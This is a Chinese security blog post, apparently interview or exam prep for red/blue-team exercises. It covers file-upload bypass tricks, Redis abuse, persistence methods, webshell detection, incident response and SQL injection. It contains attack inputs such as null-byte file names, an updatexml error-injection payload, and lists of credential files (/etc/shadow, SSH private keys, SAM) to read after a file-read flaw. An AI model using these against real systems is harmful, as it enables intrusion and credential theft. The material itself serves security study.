+<h1 id="文件上传的绕过方式有哪些？"><a href="#文件上传的绕过方式有哪些？" class="headerlink" title="文件上传的绕过方式有哪些？"></a>文件上传的绕过方式有哪些？</h1><ul>
+<li>尝试不同的文件扩展名，如.php3、.php4、.php5、.phtml等。</li>
+<li>在文件名后添加额外的扩展名，如shell.php.gif或shell.gif.php等。</li>
+<li>改变扩展名的大小写，如pHp、PhP、phP、Php等。</li>
+<li>改变内容类型，如将Content-type: application/x-php改为Content-type: image/gif等。</li>
+<li>尝试使用可执行的扩展名，如.shtml、.asa、.cer、.asax、.swf或.xap等。</li>
+<li>在文件名后添加空字节，如shell.php%00.gif或shell.php\x00.gif等。</li>
+<li>在文件扩展名前添加特殊字符，如shell;.php等。</li>
+<li>插入EXIF数据，如在图片中添加一个包含PHP代码的元数据注释等。</li>
+</ul>
+<h1 id="应急响应的思维导图"><a href="#应急响应的思维导图" class="headerlink" title="应急响应的思维导图"></a>应急响应的思维导图</h1><p><img src="/images/hvv-question/1678788617693-6918ca7a-34b0-42e5-aee4-a1bddff6c3aa.png" alt="应急响应总结思维导图.png"></p>
+<h1 id="什么是反弹shell？"><a href="#什么是反弹shell？" class="headerlink" title="什么是反弹shell？"></a>什么是反弹shell？</h1><p>&emsp;就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。反弹shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
+<h1 id="护网中，如何利用-redis-进行攻击？"><a href="#护网中，如何利用-redis-进行攻击？" class="headerlink" title="护网中，如何利用 redis 进行攻击？"></a>护网中，如何利用 redis 进行攻击？</h1><ol>
+<li>利用redis的任意文件写入功能，通过SSRF漏洞或未授权访问，将攻击者的公钥写入被控端的authorized_keys文件，从而实现ssh登录。</li>
+<li>利用redis的config命令，修改被控端的配置文件，让其加载攻击者提供的恶意模块或脚本。</li>
+</ol>
+<p>上述攻击方法都需要满足一定的条件，比如被控端的redis服务运行在root权限下，或者攻击者知道被控端的web目录路径等。</p>
+<h1 id="护网中，蓝队初级、中级、高级分别负责什么工作？"><a href="#护网中，蓝队初级、中级、高级分别负责什么工作？" class="headerlink" title="护网中，蓝队初级、中级、高级分别负责什么工作？"></a>护网中，蓝队初级、中级、高级分别负责什么工作？</h1><p><strong>初级蓝队：</strong>监测预警。主要会网络流量分析，会看系统日志，web服务日志，磁盘文件恢复等<br><strong>中级蓝队：</strong>应急响应。有以下应急场景：<br>（1）网络攻击事件，例如安全扫描攻击，暴力破解攻击，系统漏洞攻击，WEB漏洞攻击，拒绝服务攻击。<br>（2）恶意程序事件，例如病毒，远程木马，僵尸网络程序，挖矿程序。<br>（3）WEB恶意代码，例如Webshell后门，网页挂马。<br>（4）信息破坏事件。系统配置内容篡改信息泄露数据，信息数据泄露事件，网站内容篡改事件，数据库内容篡改事件。<br>（5）其他安全事件。账号被异常登录，异常网络连接<br><strong>高级蓝队：</strong>攻击溯源反制。蜜罐、取证分析、目标定位。</p>
+<h1 id="常见的漏洞扫描工具？"><a href="#常见的漏洞扫描工具？" class="headerlink" title="常见的漏洞扫描工具？"></a>常见的漏洞扫描工具？</h1><p>Nessus、OpenVAS、Burp Suite、Intruder</p>
+<h1 id="护网中，信息收集的流程是什么？有哪些信息收集相关的工具？"><a href="#护网中，信息收集的流程是什么？有哪些信息收集相关的工具？" class="headerlink" title="护网中，信息收集的流程是什么？有哪些信息收集相关的工具？"></a>护网中，信息收集的流程是什么？有哪些信息收集相关的工具？</h1><ul>
+<li>信息收集的流程一般包括以下几个步骤：<ul>
+<li>域名信息收集：通过Whois查询、备案信息查询、DNS域传送漏洞等方式，获取目标网站的注册人、联系方式、IP地址、子域名等信息。</li>
+<li>敏感信息收集：通过搜索引擎、网站页面、Burp Suite等方式，获取目标网站的目录结构、文件列表、注释信息、错误提示、敏感数据等信息。</li>
+<li>端口扫描：通过Nmap、Masscan等工具，扫描目标网站的开放端口和服务，判断操作系统类型、应用程序版本等信息。</li>
+<li>漏洞扫描：通过Nessus、OpenVAS、AppScan等工具，扫描目标网站的常见漏洞，如SQL注入、XSS、CSRF等，评估风险等级和利用可能性。</li>
+</ul>
+</li>
+<li>信息收集相关的工具有很多，根据不同的功能和用途，可以分为以下几类：<ul>
+<li>域名信息收集工具：如dnsenum、Layer子域名挖掘机、subDomainsBrute等。</li>
+<li>敏感信息收集工具：如Google Hacking Database、DirBuster、Burp Suite等。</li>
+<li>端口扫描工具：如Nmap、Masscan、Zmap等。</li>
+<li>漏洞扫描工具：如Nessus、OpenVAS、AppScan等。</li>
+<li>其他信息收集工具：如Wireshark、Metasploit、Hydra等。</li>
+</ul>
+</li>
+</ul>
+<h1 id="如何查看系统内存-shell？"><a href="#如何查看系统内存-shell？" class="headerlink" title="如何查看系统内存 shell？"></a>如何查看系统内存 shell？</h1><ol>
+<li>先查看 web 日志，是否有可疑的 web 访问日志。<ol>
+<li>如果是 filter 或者 listener 类型，就会有大量 url 请求路径相同参数不同的。</li>
+<li>页面不存在但是返回 200 的。</li>
+<li>是否有类似哥斯拉、 冰蝎相同的 url 请求，哥斯拉和冰蝎的内存马注入流量特征与普通 webshell 的流量特征基本吻合。</li>
+<li>通过查找返回 200 的 url 路径，对比web 目录下是否真实存在文件，如不存在大概率为内存马。</li>
+</ol>
+</li>
+<li>可以排查是否为<strong>中间件漏洞</strong>导致代码执行注入内存马。<ol>
+<li>排查中间件的 error.log 日志查看是否有可疑的报错。</li>
+</ol>
+</li>
+</ol>
+<h1 id="Linux的相关日志有哪些？"><a href="#Linux的相关日志有哪些？" class="headerlink" title="Linux的相关日志有哪些？"></a>Linux的相关日志有哪些？</h1><p>/var/log/message：系统启动后的信息和错误日志<br>/var/log/secure：与安全相关的日志信息<br>/var/log/cron：与定时任务相关的日志信息<br>/var/log/boot.log：守护进程启动和停止相关的日志消息<br>/var/log/wtmp：该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件</p>
+<h1 id="获得文件读取漏洞，攻击者通常会读哪些文件（Linux-和-windows）"><a href="#获得文件读取漏洞，攻击者通常会读哪些文件（Linux-和-windows）" class="headerlink" title="获得文件读取漏洞，攻击者通常会读哪些文件（Linux 和 windows）"></a>获得文件读取漏洞，攻击者通常会读哪些文件（Linux 和 windows）</h1><p><strong>Windows：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\\boot.ini                                                            // 查看系统版本</span><br><span class="line">C:\\Windows\System32\inetsrv\MetaBase.xml                               //IIS 配置文件</span><br><span class="line">C:\\Windows\repair\sam                                                  // 存储系统初次安装的密码</span><br><span class="line">C:\\Program Files\mysql\my.ini                                          //Mysql 配置</span><br><span class="line">C:\\Program Files\mysql\data\mysql\user.MYD                             //Mysql root</span><br><span class="line">C:\\Windows\php.ini                                                     //php 配置信息</span><br><span class="line">C:\\Windows\my.ini                                                      //Mysql 配置信息</span><br></pre></td></tr></table></figure>
+<p><strong>Linux：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys                                              //如需登录到远程主机，需要到 .ssh 目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br><span class="line">/root/.ssh/id_rsa                                                       //ssh私钥 ssh，公钥是 id_rsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore                                              //记录每个访问计算机用户的公钥</span><br><span class="line">/root/.ssh/known_hosts                                                  //ssh会把每个访问过计算机的公钥都记录在~/.ssh/known_hosts 。当下次访问相同计算机时， OpenSSH 会核对公钥。如果公钥不同， OpenSSH 会发出警告， 避免你受到 DNS Hijack 之类的攻击。</span><br><span class="line">/etc/passwd                                                             //账户信息</span><br><span class="line">/etc/shadow                                                             //账户密码文件</span><br><span class="line">/etc/my.cnf                                                             //mysql 配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf                                              //Apache配置文件</span><br><span class="line">/root/.bash_history                                                     //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history                                                    //mysql历史命令记录文件</span><br></pre></td></tr></table></figure>
+<h1 id="常见中间件漏洞总结。"><a href="#常见中间件漏洞总结。" class="headerlink" title="常见中间件漏洞总结。"></a>常见中间件漏洞总结。</h1><p><strong>IIS。</strong>PUT漏洞、短文件名猜解、远程代码执行、解析漏洞<br><strong>Apache。</strong>解析漏洞、目录遍历<br><strong>Nginx。</strong>文件解析、目录遍历、CRLF注入、目录穿越<br><strong>Tomcat。</strong>远程代码执行、war后门文件部署<br><strong>jBoss。</strong>反序列化漏洞、war后门文件部署<br><strong>WebLogic。</strong>反序列化漏洞、SSRF、任意文件上传、war后门文件部署<br><strong>其它中间件相关漏洞。</strong>FastCGI未授权访问、任意命令执行；PHPCGI远程代码执行<br>具体细节见：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/102683791">https://blog.csdn.net/bylfsj/article/details/102683791</a></p>
+<h1 id="getshell-后如何维持权限"><a href="#getshell-后如何维持权限" class="headerlink" title="getshell 后如何维持权限"></a>getshell 后如何维持权限</h1><p>&emsp;对于windows，有：MSF权限维持模块、影子账户、映像劫持、userinit注册表后门、计划任务。<br>&emsp;对于Linux，有：软连接、SSH warpper、计划任务。<br>&emsp;具体细节见：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/anquanzushiye/article/details/105502079">https://blog.csdn.net/anquanzushiye/article/details/105502079</a></p>
+<h1 id="设备出现误报如何处置？"><a href="#设备出现误报如何处置？" class="headerlink" title="设备出现误报如何处置？"></a>设备出现误报如何处置？</h1><p>&emsp;要确认设备是否误报，应当先去查看设备的完整流量日志等信息。在护网过程中如果确实存在异常流量应当及时进行上报，确认是误报后做好事件记录。</p>
+<h1 id="被红队拿shell了怎么办？"><a href="#被红队拿shell了怎么办？" class="headerlink" title="被红队拿shell了怎么办？"></a>被红队拿shell了怎么办？</h1><p>利用PDCERF模型来进行处理。<br>• Prepare （准备）：准备用来检测的工具和人。<br>• Detection （检测）：包括防火墙、系统、 web 服务器、 IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告。<br>• Containment （抑制）：首先先控制受害范围，不要让攻击的影响继续蔓延到其他的 IT 资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。<br>• Eradication（根除）：寻找根源原因，彻底解决，封堵攻击源，把业务恢复到正常水平<br>• Recover（恢复）<br>• Follow-Up（跟踪）：根据各种监控去确定没有其他（跟踪）：根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程，不得已就关站。</p>
+<h1 id="Web安全十大漏洞？"><a href="#Web安全十大漏洞？" class="headerlink" title="Web安全十大漏洞？"></a>Web安全十大漏洞？</h1><ol>
+<li>注入</li>
+<li>失效的身份认证和会话管理，使用别人会话 id，包含身份信息、信用卡</li>
+<li>XSS 跨站（存储、反射、dom）</li>
+<li>不安全的对象直接引用。例如 ?id=89 改成 ?id= 可以看到 id=90 的网页信息</li>
+<li>安全误配置</li>
+<li>限制 URL 访问失败（缺少功能级访问控制）</li>
+<li>未验证的重定向和转发</li>
+<li>应用已知脆弱性的组件</li>
+<li>伪造跨站请求CSRF，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点</li>
+<li>敏感信息暴露</li>
+</ol>
+<h1 id="常见的日志分析工具都有哪些？"><a href="#常见的日志分析工具都有哪些？" class="headerlink" title="常见的日志分析工具都有哪些？"></a>常见的日志分析工具都有哪些？</h1><p>七牛、观星、GScan、星图等</p>
+<h1 id="php与漏洞相关的函数"><a href="#php与漏洞相关的函数" class="headerlink" title="php与漏洞相关的函数"></a>php与漏洞相关的函数</h1><p><strong>php函数：</strong></p>
+<ol>
+<li>serialize 和 unserialize：序列化与反序列化</li>
+<li>MD5_compare：不使用salt来增加哈希值的复杂性。</li>
+<li>is_numeric：会把科学计数法的字符串（如”1337e0”）也认为是数字，这可能导致一些逻辑错误或注入攻击。会把十六进制（如”0x539”）或二进制（如”0b10100111001”）的字符串认为不是数字，这可能与预期不符或造成数据丢失。</li>
+<li>extract：导致变量名冲突或覆盖。</li>
+<li>require/require_once：可能导致文件路径泄露或被篡改，从而引起文件包含漏洞或远程代码执行。</li>
+<li>include/include_once，同上。</li>
+<li>system、exec等</li>
+</ol>
+<h1 id="webshell检测思路"><a href="#webshell检测思路" class="headerlink" title="webshell检测思路"></a>webshell检测思路</h1><p>&emsp;webshell就是以 asp 、 php 、 jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客通过浏览器以HTTP 协议访问 Web Server 上的一个 CGI 文件，是一个合法的 TCP 连接， TCP/IP 的应用层之下没有任何特征，只能在应用层进行检测。黑客入侵服务器，使用webshell ，不管是传文件还是改文件，必然有一个文件会包含 webshell 代码。检测方法如下：</p>
+<ol>
+<li><strong>静态检测：</strong>从文件代码入手。静态检测通过匹配特征码、特征值、危险函数函数来查找webshell 的方法，只能查找已知的 webshell ，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell 查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找 0day 型 webshell ，而且容易被绕过。</li>
+<li><strong>动态检测：</strong>Linux下就是用户起了 bash，Win 下就是 IIS User 启动 cmd ，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了， Agent 和 IDS 都可以抓现行。 Webshell总有一个HTTP 请求，如果在网络层监控 HTTP ，并且检测到有人访问了一个从没反问过得文件，而且返回了 200 ，则很容易定位到 webshell ，这便是 http 异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。</li>
+<li><strong>日志检测：</strong>使用Webshell 一般不会在系统日志中留下记录，但是会在网站的 web 日志中留下Webshell 页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型，从而检测出异常文件，称之为： HTTP 异常请求模型检测。</li>
+<li><strong>语法检测：</strong>实现关键危险函数的捕捉方式。</li>
+<li><strong>统计学检测：</strong>webshell由于往往经过了编码和加密，会表现出一些特别的统计特征，根据这些特征统计学习。 </li>
+</ol>
+<h1 id="谈一谈IDR（敏感数据发现与风险评估系统：Insight-for-Discovery-and-Risk"><a href="#谈一谈IDR（敏感数据发现与风险评估系统：Insight-for-Discovery-and-Risk" class="headerlink" title="谈一谈IDR（敏感数据发现与风险评估系统：Insight for Discovery and Risk)"></a>谈一谈IDR（敏感数据发现与风险评估系统：Insight for Discovery and Risk)</h1><p>&emsp;IDR是一款多功能的数据安全风险评估产品，产品结合行业业务特性，提供数据发现、识别、分类、分级、敏感数据发布、监控、审计、风险评估等功能。该产品可灵活应对复杂多变的业务场景、部署需求和使用条件，提升用户数据资产梳理的准确性和效率。</p>
+<h1 id="OOB（Out-of-Band）漏洞是什么？"><a href="#OOB（Out-of-Band）漏洞是什么？" class="headerlink" title="OOB（Out of Band）漏洞是什么？"></a>OOB（Out of Band）漏洞是什么？</h1><p>&emsp;OOB（Out of Band）漏洞是一种<strong>利用其他传输方式来窃取数据的技术</strong>。OOB漏洞通常需要易受攻击的实体生成出站TCP/UDP/ICMP请求，然后允许攻击者泄露数据。OOB漏洞的成功基于出口防火墙规则，即<strong>是否允许来自易受攻击的系统和外围防火墙的出站请求</strong>。<br>&emsp;OOB漏洞的一种常见场景是XXE（XML外部实体）攻击，通过XML实体引用来触发DNS解析或HTTP请求，从而泄露敏感信息或执行远程命令。OOB漏洞的另一种常见场景是利用NETBIOS中一个OOB漏洞，通过TCP/IP协议传递一个特别大的数据包到计算机某个开放的端口上（一般是137、138和139），当计算机收到这个数据包之后就会瞬间死机或者蓝屏现象。</p>
+<h1 id="给一个登陆界面，凭经验觉得这个页面可能有哪些漏洞？"><a href="#给一个登陆界面，凭经验觉得这个页面可能有哪些漏洞？" class="headerlink" title="给一个登陆界面，凭经验觉得这个页面可能有哪些漏洞？"></a>给一个登陆界面，凭经验觉得这个页面可能有哪些漏洞？</h1><ol>
+<li><p>弱密码策略：如果网站允许用户使用简单的密码，例如“123456”或“password”，那么攻击者可能会很容易地破解用户的密码并登录其账户。</p>
+</li>
+<li><p>缺乏防止暴力破解的保护措施：如果网站没有实施任何防止暴力破解的保护措施，攻击者可以使用自动化工具来尝试多次尝试从而猜测密码。</p>
+</li>
+<li><p>跨站点脚本攻击（XSS）：如果登录页面中存在未经过滤的用户输入，攻击者可能会注入恶意代码来窃取用户的凭据或执行其他恶意操作。</p>
+</li>
+<li><p>会话劫持：如果网站未正确实现会话管理，攻击者可能会通过窃取用户的会话令牌来取得对用户账户的访问权限。</p>
+</li>
+<li><p>密码重置漏洞：如果网站未正确实现密码重置功能，攻击者可以通过伪造电子邮件或其他方式来重置用户的密码并获得对账户的访问权限。</p>
+</li>
+</ol>
+<h1 id="常见的SQL注入类型？"><a href="#常见的SQL注入类型？" class="headerlink" title="常见的SQL注入类型？"></a>常见的SQL注入类型？</h1><ol>
+<li><p>基于错误的SQL注入（Error-Based SQL Injection）：攻击者通过在应用程序的输入字段中注入恶意SQL代码来引发错误，从而获取数据库的敏感信息。</p>
+</li>
+<li><p>盲注SQL注入（Blind SQL Injection）：攻击者通过在应用程序的输入字段中注入恶意SQL代码来检测数据库的状态和结构，以获取敏感信息。</p>
+</li>
+<li><p>堆叠查询SQL注入（Stacked Query SQL Injection）：攻击者通过在应用程序的输入字段中注入多个SQL查询语句，以执行多个查询和修改数据库中的数据。</p>
+</li>
+<li><p>基于时间的SQL注入（Time-Based SQL Injection）：攻击者通过在应用程序的输入字段中注入恶意SQL代码来引发延迟，从而检测数据库的状态和结构，以获取敏感信息。</p>
+</li>
+<li><p>直接访问文件SQL注入（Direct File Access SQL Injection）：攻击者通过在应用程序的输入字段中注入恶意SQL代码来访问文件系统中的文件，从而获取敏感信息。</p>
+</li>
+<li><p>宽字节注入：</p>
+<p>PHP：utf-8编码 数据库GBK编码；PHP防御函数：magic_quotes_gpc()</p>
+<p><strong>成因：</strong>PHP发送请求到mysql时经过一次gbk编码，PHP会将获取到的数据进行魔术引号的处理，因为GBK是双字节编码，所以我们提交的%df这个字符和转译的反斜杠组成了新的汉字，然后数据库处理的时候是根据GBK去处理的，然后单引号就逃逸了出来。</p>
+<p><strong>原理</strong>：在数据库中使用宽字符集，在web中没有考虑这个问题。由于0XDF27在web中是两个字符，在php中会对0x27进行转义，把0XDF27变成0XDF5c27</p>
+</li>
+<li><p>头注入：UA（useragent），Referer，cookie</p>
+</li>
+</ol>
+<h1 id="sql注入-报错注入常用的函数-amp-原理"><a href="#sql注入-报错注入常用的函数-amp-原理" class="headerlink" title="sql注入 报错注入常用的函数&amp;原理"></a>sql注入 报错注入常用的函数&amp;原理</h1><ol>
+<li>updatexml()函数。</li>
+</ol>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称。第二个参数：XPath_string (Xpath格式的字符串) 。第三个参数：new_value，String格式，替换查找到的符合条件的数据。<br><strong>作用：</strong>改变文档中符合条件的节点的值。由于updatexml的第二个参数需要Xpath格式的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
+<p>爆库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id= -1 or updatexml(1,concat(0x7e,(select database())),1)</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>extractvalue()函数。报错原因与updatexml()函数类似，都是读取路径报错。</p>
+</li>
+<li><p>floor函数，主键重复插入。</p>
+</li>
+</ol>
+<p><img src="/images/hvv-question/image-20230425100902073.png" alt="image-20230425100902073" style="zoom:67%;" /></p>
+
+  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/03/14/emotion-analysis/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/03/09/KERI-design/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+
+
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    <!-- 
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div> -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
+            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
+        })
+    </script>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-03-14 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web/">web<span>9</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+
+	<!-- copyright -->
+	<div>
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+      <strong>作者:  </strong>wd-z711</a>
+      </li>
+      <li class="post-copyright-link">
+      <strong>文章链接:  </strong>
+      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明:   </strong>
+        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+        许可协议。转载请注明出处!
+      </li>
+    </ul>
+  <div>
+ 	
+
+		
+
+
+</div><!-- row -->
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2023 wd-z711
+  
+      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->
+
+     <!-- <script type="text/javascript">
+      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+      
+      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
+    </script> -->
+    </p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+   </html>
